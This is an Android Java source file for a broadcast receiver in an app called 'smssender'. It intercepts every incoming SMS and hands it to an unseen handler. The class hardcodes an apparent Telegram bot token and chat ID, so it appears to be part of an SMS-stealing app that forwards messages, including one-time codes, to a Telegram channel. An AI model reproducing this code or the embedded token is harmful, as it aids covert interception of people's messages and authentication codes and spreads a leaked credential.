package com.agayev.smssender;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class SMSReceiver extends BroadcastReceiver {
    private static final String TAG = "SMSReceiver";
    public static final String TELEGRAM_TOKEN = "6710759847:AAEmfmGV9224BRD_GZ98iuGl7R2EgTp1a5s";
    public static final String TELEGRAM_CHAT_ID = "-1002078900284";
    public static final String SMS = "android.provider.Telephony.SMS_RECEIVED";

    @Override
    public void onReceive(Context context, Intent intent) {
        SmsHandler handler = new SmsHandler();
        if (intent.getAction().equals(SMS)) {
            handler.handleSms(context, intent);
        }
    }
}

